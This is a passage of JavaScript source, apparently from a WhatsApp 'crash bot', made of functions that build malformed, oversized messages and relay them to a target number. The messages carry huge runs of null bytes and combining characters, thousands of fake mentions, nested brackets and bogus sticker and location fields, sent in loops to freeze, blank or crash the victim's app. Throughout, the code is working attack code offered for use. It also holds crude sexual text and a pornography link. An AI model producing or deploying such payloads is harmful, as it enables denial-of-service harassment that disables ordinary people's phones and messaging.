                messageAssociation: {
                    associationType: 1,
                    parentMessageKey: album.key
                }
            }
        }
    };

    let msg5 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: {
                        text: " #JustinOffc",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "carousel_message",
                        paramsJson: "\u0000".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "YT JustinOfficial-ID",
                            newsletterJid: "120363403897687476@newsletter",
                            serverMessageId: 1
                        },
                        statusAttributionType: "SHARED_FROM_MENTION",
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({
                                    length: 1999
                                }, () =>
                                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                            ),
                        ]
                    }
                }
            }
        }
    }, {});

    const msg6 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "ꦾ".repeat(60000),
                    publisher: "ꦾ".repeat(60000),
                    caption: " ### ",
                    stickers: [{
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "Axata-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "Justin-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "Justin-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "Justin-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "Justin-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "Justin-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "Justin-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "Justin-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        }
                    ],
                    fileLength: "999999999",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
                    contextInfo: {
                        remoteJid: "X",
                        participant: "0@s.whatsapp.net",
                        stanzaId: "1234567890ABCDEF",
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({
                                    length: 1990
                                }, () =>
                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    packDescription: "",
                    mediaKeyTimestamp: "1747502082",
                    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
                    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                    thumbnailHeight: 252,
                    thumbnailWidth: 252,
                    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
                    stickerPackSize: "999999999",
                    stickerPackOrigin: "USER_CREATED",
                    quotedMessage: {
                        callLogMesssage: {
                            isVideo: true,
                            callOutcome: "REJECTED",
                            durationSecs: "1",
                            callType: "SCHEDULED_CALL",
                            participants: [{
                                    jid: target,
                                    callOutcome: "CONNECTED"
                                },
                                {
                                    target: "support@s.whatsapp.net",
                                    callOutcome: "REJECTED"
                                },
                                {
                                    target: "13135550002@s.whatsapp.net",
                                    callOutcome: "ACCEPTED_ELSEWHERE"
                                },
                                {
                                    target: "status@broadcast",
                                    callOutcome: "SILENCED_UNKNOWN_CALLER"
                                },
                            ]
                        }
                    },
                },
            },
        },
    }, {});

    for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
        await axata.relayMessage("status@broadcast", msg.message ?? msg, {
            messageId: msg.key?.id || undefined,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: {
                            jid: target
                        }
                    }]
                }]
            }]
        });
        console.log(chalk.green("SUCCESS SEND BUGLOTINVIS"));
    }
}

async function AxtDelay(target, axata = false) {
    for (let i = 0; i < 50; i++) {
        const PouMsg = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: {
                    text: "-( HI, I'M AXATA CRASH💲)-",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(502180),
                    version: 3
                }
            },
            contextInfo: {
                mentionedJid: Array.from({
                    length: 2000
                }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
            }
        }, {});

        await axata.relayMessage(
            target, {
                groupStatusMessageV2: {
                    message: PouMsg.message,
                    participant: {
                        jid: target
                    }
                }
            },
            poucode ? {
                messageId: PouMsg.key.id,
                participant: {
                    jid: target
                }
            } : {
                messageId: PouMsg.key.id
            }
        );

        await new Promise(resolve => setTimeout(resolve, 200));
    }
}

async function DelayAxata(target) {
    for (let i = 0; i < 50; i++) {
        const PouMsg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "\u0000".repeat(200),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(1000000),
                            version: 3,
                            entryPointConversionSource: "call_permission_message"
                        }
                    },
                    contextInfo: {
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({
                                    length: 1900
                                }, () =>
                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                        ],
                        remoteJid: "status@broadcast",
                        forwardingScore: 999,
                        isForwarded: true
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" +
                Math.floor(Math.random() * 16777215)
                .toString(16)
                .padStart(6, "0")
        });
        await axata.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: {
                            jid: target
                        },
                        content: undefined
                    }]
                }]
            }]
        });
    }
}

async function Delayinvis(target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({
                            status: true
                        }),
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from({
                            length: 30000
                        },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});

    await axata.relayMessage("status@broadcast", PouMsg.message, {
        messageId: PouMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

// -----------------( END FUNCTION DELAY )--------------------- \\


// ------------------ ( FUNCTION BLANK ) ------------------------ \\

async function AstecBlankButon(axata, target) { 
  try {
    const message = {
      interactiveMessage: {  
        contextInfo: {
          remoteJid: target,
          participant: target,
          stanzaId: sock.generateMessageTag(),
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "",
            },
            {
              name: "call_permission_request",
              buttonParamsJson: JSON.stringify({ status: true }),
            },
            {
              name: "send_location",
              buttonParamsJson: JSON.stringify({ status: true }),
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                id: "reply_quick",
              }),
            },
            {
              name: "open_url",
              buttonParamsJson: JSON.stringify({
                url: "https://example.com",
              }),
            },
            {
              name: "share_contact",
              buttonParamsJson: JSON.stringify({
                contact_id: "6281234567890@s.whatsapp.net",
              }),
            },
            {
              name: "view_profile",
              buttonParamsJson: JSON.stringify({
                id: "profile_view",
              }),
            },
          ],
        },
      },
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "123456789@newsletter",
            newsletterName: "This Astec?" + 
            "ꦽ".repeat(500) + 
            "ꦾ".repeat(65000),
            jpegThumbnail: "https://files.catbox.moe/l4d58g.jpg",
            caption: "ꦾ".repeat(65000),
            inviteExpiration: Date.now() + 9999999999,
          },
        },
      },
      nativeFlowResponseMessage: {
        messageParamsJson: "{".repeat(4500),
      },
    };

    await axata.relaymesangge(target, message, {
      userJid: target,
      participant: { jid: target },
      messageId: sock.generateMessageTag(), 
    });

    console.log("bug succes sending");
  } catch (error) {
    console.log("error:\n" + error);
  }
}

async function XBlankhp(axata, target) {
  let cards = [];
  let push = [];
  
  let buttons = [
    {
      name: "single_select",
      buttonParamsJson: "",
    },
  ];
  
  for (let i = 0; i < 2000; i++) {
    buttons.push(
      {
        name: "send_location",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
          flow_cta_version_call: 3.0,
        }),
      },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
          flow_cta_version_call: 3.0,
        }),
      },
      {
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
          flow_cta_version_call: 3.0,
        }),
      }
    );
  }
  
  let mpm = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
          fileEncSha256: "LaaBTYFkIZxif2lm2TfSIt9yATBfYd9w86UxehMa4rI=",
          mediaKey: "7XhMJyn+ss8sVb2qs36Kh9+lrGVwu29d1IO0ZjHa09A=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA?ccb=9-4&oh=01_Q5Aa2wExHZhJFzy9jE5OTov33YwJCo2w8UqmhRgqHNrqT4KPUQ&oe=692440E0&_nc_sid=e6ed6c",
          fileLength: "22254",
          mediaKeyTimestamp: "1761396583",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
          },
        },
        body: {
          text: "Ahh Vagina Mu Menjepit Erat Kontol Ku" + "ꦽ".repeat(25000) + "ꦽ".repeat(15000),
        },
        nativeFlowMessage: {
         messageParamsJson: "{[".repeat(10000),
          buttons: buttons,
        },
        quotedMessage: {
          locationMessage: {
            degreesLatitude: 999999999,
            degreesLongitude: -999999999,
             name: '{'.repeat(15000),
             address: '{'.repeat(15000)
          },
        },
      },
    },
  },
};

 let msg = {
   epheralMessage: {
     message: {
       carouselMessage: {
         messageVersion: 2,
           cards: [
            {
              header: {
                imageMessage: {
                url: "",
              },
            },
          },
        ],
      },
      quotedMessage: {
        paymentInviteMessage: {
           serviceType: 3,
           expiryTimestamp: Date.now() + 1814400000
        },
      },
    },
  },
};
           
 let stc = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          header: {
            title: "Ahh".repeat(30000),
            hasMediaAttachment: true,
          },
          body: { 
            text: "CAIRAN MU ENAKNY".repeat(35000),
            format: "EXTENTION_1",
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => '0292873892827' + (z + 1) + '@s.whatsapp.net'),
            externalAdReply: {
              title: "Ondet",
              body: tai,
              mediaType: 1,
              thumbnailUrl: "https://files.catbox.moe/gqmtzz.jpg",
              sourceUrl: "https://xnxx.com"
            },
            extendedTextMessage: {
              text: "{".repeat(60000),
              contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`) }
            }
          },
          businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" },
          statusAttributionType: "SHARED_FROM_MENTION",
          nativeFlowResponseMessage: {
            name: "menu_options",
            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx"}}`,
            version: 3
          }
        }
      }
    }
  };
  
  const msg1 = generateWAMessageFromContent(target, mpm, {});
  
  await axata.relayMessage(target, msg1, {
    messageId: null,
    participant: { jid: target },
  });
  
  await axata.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
  });
  
  await axata.relayMessage("status@broadcast", stc, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [   
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });
  
  console.log(chalk.green("Succes Sending Bug MeteoritBlade"));
}

async function XBlankUi(axata, target) {  
    console.log(chalk.red(`SUCCESS MENGIRIM BUGS BY AXATA`));  

    let AyunCantik = JSON.stringify({  
        status: true,  
        criador: "☠️AxataCrash☠️",  
        resultado: {  
            type: "md",  
            ws: {  
                _events: {  
                    "CB:ib,,dirty": ["Array"]  
                },  
                _eventsCount: 80000,  
                _maxListeners: 0,  
                url: "wss://web.whatsapp.com/ws/chat",  
                config: {  
                    version: ["Array"],  
                    browser: ["Array"],  
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",  
                    sockCectTimeoutMs: 2000,  
                    keepAliveIntervalMs: 30000,  
                    logger: {},  
                    printQRInTerminal: false,  
                    emitOwnEvents: true,  
                    defaultQueryTimeoutMs: 6000,  
                    customUploadHosts: [],  
                    retryRequestDelayMs: 250,  
                    maxMsgRetryCount: 5,  
                    fireInitQueries: true,  
                    auth: { Object: "authData" },  
                    markOnlineOnsockCect: true,  
                    syncFullHistory: true,  
                    linkPreviewImageThumbnailWidth: 192,  
                    transactionOpts: { Object: "transactionOptsData" },  
                    generateHighQualityLinkPreview: false,  
                    options: {},  
                    appStateMacVerification: { Object: "appStateMacData" },  
                    mobile: true  
                }  
            }  
        }  
    });  

    
    const namaList = [
        "ꦾ".repeat(180000),
        "ꦾ".repeat(180000),
        "ꦽ".repeat(180000),
      "ꦽ".repeat(180000),
        "𑇂𑆵𑆴𑆿".repeat(60000),
        "𑇂𑆵𑆴𑆿".repeat(60000)
    ];  

    for (const nama of namaList) {  
        const generateLocationMessage = {  
            viewOnceMessage: {  
                message: {  
                    locationMessage: {  
                        degreesLatitude: -9999,  
                        degreesLongitude: 9999,  
                        name: nama,
                        address: AyunCantik,  
                        contextInfo: {  
                            mentionedJid: [  
                                target,  
                                ...Array.from({ length: 1945 }, () =>  
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                                )  
                            ],  
                            isSampled: true,  
                            participant: target,  
                            remoteJid: "status@broadcast",  
                            forwardingScore: 9741,  
                            isForwarded: true  
                        }  
                    }  
                }  
            }  
        };  

        const locationMsg = generateWAMessageFromContent(target, generateLocationMessage, {});  

        await axata.relayMessage(target, locationMsg.message, {  
            messageId: locationMsg.key.id,  
            participant: { jid: target },  
            userJid: target  
        });  

        await new Promise(r => setTimeout(r, 2000));
    }  
}

async function NotifXaxata(target) {
    try {
        const content = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        header: {
                            title: "☠️AxataCrash☠️" + "ꦽ".repeat(10000) + ".com"
                        },
                        body: {
                            text: "AWAS BREE ADA AXATA☠️😹."
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}".repeat(10000),
                            buttons: [{
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        icon: "\u200B".repeat(5000),
                                        flow_cta: "ꦽ".repeat(10000),
                                        flow_message_version: "3"
                                    })
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        icon: "\u200B".repeat(5000),
                                        flow_cta: "ꦽ".repeat(10000),
                                        flow_message_version: "3"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        };

        const msg = await generateWAMessageFromContent(target, content, {
            userJid: axata?.user?.id
        });

        await axata.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
    } catch (error) {}
}

async function AdminAxata(target) {
    const PouMsg = generateWAMessageFromContent(target, {
        newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "AXATA ANJAY </>" + "𑜦𑜠".repeat(11000),
            jpegThumbnail: null,
            caption: "AXATA BRE </>",
            timestamp: "1760964628",
        },
    }, {});

    await axata.relayMessage(target, PouMsg.message, {
        messageId: PouMsg.key.id,
    });
}

async function AxataXPou(target) {
    try {
        const PouMsg = generateWAMessageFromContent(target, {
            stickerPackMessage: {
                stickerPackId: "4fd75bd4-345a-4d52-8578-ba1d23accf10",
                name: "POU HITAM BANGET 😹" + "ꦾ".repeat(77777),
                publisher: "Kamiya Crash",
                stickers: [{
                        fileName: "ro+AF6IDIkbAe-2rTD057fg-Etrf6be1v+KlCO-mgxY=.webp",
                        isAnimated: false,
                        accessibilityLabel: "😹",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "wp9kHM-GuDuNWhJ6chowTxyKu5iXirLF0KYLfcquChM=.webp",
                        isAnimated: false,
                        emojis: ["😹"],
                        accessibilityLabel: "😹",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "kLedfXUDB6c01Ro4pkvQHMyAagK7RLEZJXqTUspGydg=.webp",
                        isAnimated: false,
                        accessibilityLabel: "😹",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "01TWyF0-rk5niSMkmp27tkv4lDClUKf6ZqRsTbqlXj4=.webp",
                        isAnimated: false,
                        accessibilityLabel: "😹",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "7QmKThYmFo1sqzoOFsoCrS908m45haYkvRE13peHvKs=.webp",
                        isAnimated: false,
                        accessibilityLabel: "😹",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "Tqy5UpRqQL5-6BgBlx2-gDxCfOuSnwu+5+cD7tU3Tm4=.webp",
                        isAnimated: false,
                        emojis: ["😹"],
                        accessibilityLabel: "😹",
                        isLottie: false,
                        mimetype: "image/webp"
                    }
                ],
                fileLength: "1148087",
                fileSha256: "rhc8Ypli86IKurWWrRQQ/ywHL3uxDbP5DO9uMOukOJU=",
                fileEncSha256: "mxGTLF0KSm/AHiEoJ+5YT3CuFEmfftI/j11gsiDER6Y=",
                mediaKey: "TG2AaJksSnCY+ZsHXQlwOFxzqZ9sluTWC5eBsHsieO4=",
                directPath: "/v/t62.15575-24/535779180_1507906547204063_7516664926710771811_n.enc?ccb=11-4&oh=01_Q5Aa2wFF-2YtVcq9eEKAydOHWcRm7S2lir_2f8I2IM2fCE8sBA&oe=6926263A&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1761527208",
                trayIconFileName: "4fd75bd4-345a-4d52-8578-ba1d23accf10.png",
                thumbnailDirectPath: "/v/t62.15575-24/531783233_2062223397906919_6504233161635066279_n.enc?ccb=11-4&oh=01_Q5Aa2wErfX7cZi-UOV3-hfvF5of5pZk5lex3T3vR0GOww_IiaA&oe=69263A5A&_nc_sid=5e03e0",
                thumbnailSha256: "CMUDEx645mKI+gSQuyq4FQU1WeuTZoJcLabHlGuiNl8=",
                thumbnailEncSha256: "8m8HtdjNUKj0eW4dQEGBrzHW3NhFpIuSBEX3olTzISk=",
                thumbnailHeight: 252,
                thumbnailWidth: 252,
                imageDataHash: "MGU4OThjYTc0Y2M5YzgzMzg1NDgyZjA2ODU3MDZlZmM4ODVhZmU0NDUwNWM2MjE4OTEwMGMyZDMzOTNmMTQ2Zg==",
                stickerPackSize: "1150834",
                stickerPackOrigin: "USER_CREATED",
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 999,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363419085046817@newsletter",
                        serverMessageId: 1,
                        newsletterName: "POU HITAM BANGET 😹︎"
                    },
                    message: {
                        paymentInviteMessage: {
                            expiryTimestamp: Date.now(),
                            serviceType: 3,
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999
                            }
                        }
                    }
                }
            }
        }, {});

        await axata.relayMessage(target, PouMsg.message, {
            messageId: "KamiyCrash-" + Date.now()
        });

        console.log("DONE BY GW 👾");
    } catch (sange) {
        console.error("ERROR ANJIR:", sange);
    }
}

// -----------------( END FUNCTION BLANK )--------------------- \\



// ------------------ ( FUNCTION FREZZE ) ------------------------ \\

async function FeezeCrash(axata, target) {
    for (let i = 0; i < 10; i++) {
        let push = [];
        let buttt = [];

        for (let i = 0; i < 10; i++) {
            buttt.push({
                "name": "galaxy_message",
                "buttonParamsJson": JSON.stringify({
                    "header": "\u0000".repeat(10000),
                    "body": "\u0000".repeat(10000),
                    "flow_action": "navigate",
                    "flow_action_payload": {
                        screen: "FORM_SCREEN"
                    },
                    "flow_cta": "Grattler",
                    "flow_id": "1169834181134583",
                    "flow_message_version": "3",
                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                })
            });
        }

        for (let i = 0; i < 10; i++) {
            push.push({
                "body": {
                    "text": "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁" + "軎�".repeat(11000)
                },
                "footer": {
                    "text": "dont panic!!"
                },
                "header": {
                    "title": '饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁' + "\u0000".repeat(50000),
                    "hasMediaAttachment": true,
                    "imageMessage": {
                        "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                        "mimetype": "image/jpeg",
                        "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                        "fileLength": "591",
                        "height": 0,
                        "width": 0,
                        "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                        "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                        "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                        "mediaKeyTimestamp": "1721344123",
                        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
                        "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                        "scanLengths": [
                            247,
                            201,
                            73,
                            63
                        ],
                        "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
                    }
                },
                "nativeFlowMessage": {
                    "buttons": []
                }
            });
        }

        const carousel = generateWAMessageFromContent(isTarget, {
            "viewOnceMessage": {
                "message": {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    "interactiveMessage": {
                        "body": {
                            "text": "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁 " + "軎�".repeat(55000)
                        },
                        "footer": {
                            "text": "( 馃崄 ) 饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁 ( 馃崄 )"
                        },
                        "header": {
                            "hasMediaAttachment": false
                        },
                        "carouselMessage": {
                            "cards": [
                                ...push
                            ]
                        }
                    }
                }
            }
        }, {});

        await axata.relayMessage(isTarget, carousel.message, {
            messageId: carousel.key.id
        });
        console.log("Sending Feeze Crash !!");
    }
}

async function AxataNewUi(target, Ptcp = true) {
    console.log(chalk.red(`AXATA DI LAWAN HADEH`));
    try {
        await axata.relayMessage(
            target, {
                ephemeralMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: 0,
                                    degreesLongitude: 0,
                                },
                                hasMediaAttachment: true,
                            },
                            body: {
                                text: "𝙾𝚝𝚊𝚡 𝙽𝚒𝚎𝚑 𝙷𝚎𝚑𝚎\n" +
                                    "ꦾ".repeat(50000) +
                                    "ꦽ".repeat(50000) +
                                    `\u2003`.repeat(50000),
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                participant: target,
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from({
                                            length: 1900
                                        },
                                        () =>
                                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                    ),
                                ],
                                remoteJid: "X",
                                participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                stanzaId: "123",
                                quotedMessage: {
